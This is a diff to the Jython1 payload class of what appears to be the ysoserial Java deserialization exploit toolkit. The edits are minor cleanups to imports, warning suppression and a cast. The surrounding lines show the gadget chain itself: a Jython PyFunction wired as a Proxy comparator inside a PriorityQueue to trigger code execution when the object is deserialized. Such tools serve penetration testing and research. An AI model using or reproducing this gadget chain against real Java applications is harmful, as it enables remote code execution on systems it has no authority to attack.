@@ -7,7 +7,6 @@ import org.apache.commons.io.FileUtils;
 import org.python.core.*;
 
 import java.io.File;
-import java.lang.reflect.InvocationHandler;
 import java.lang.reflect.Proxy;
 import java.math.BigInteger;
 import java.util.Arrays;
@@ -37,7 +36,7 @@ import java.util.PriorityQueue;
  * exception information).
  */
 
-@SuppressWarnings({"rawtypes", "unchecked", "restriction"})
+@SuppressWarnings({"rawtypes", "unchecked","unused"})
 @Dependencies({"org.python:jython-standalone:2.5.2"})
 @Authors({Authors.PWNTESTER, Authors.CSCHNEIDER4711})
 public class Jython1 implements ObjectPayload<PriorityQueue> {
@@ -91,7 +90,7 @@ public class Jython1 implements ObjectPayload<PriorityQueue> {
         PyFunction handler = new PyFunction(new PyStringMap(), null, codeobj);
 
         // Prepare Trigger Gadget
-        Comparator comparator = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), new Class<?>[]{Comparator.class}, (InvocationHandler) handler);
+        Comparator comparator = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), new Class<?>[]{Comparator.class}, handler);
         PriorityQueue<Object> priorityQueue = new PriorityQueue<Object>(2, comparator);
         Object[] queue = new Object[]{1, 1};
         Reflections.setFieldValue(priorityQueue, "queue", queue);
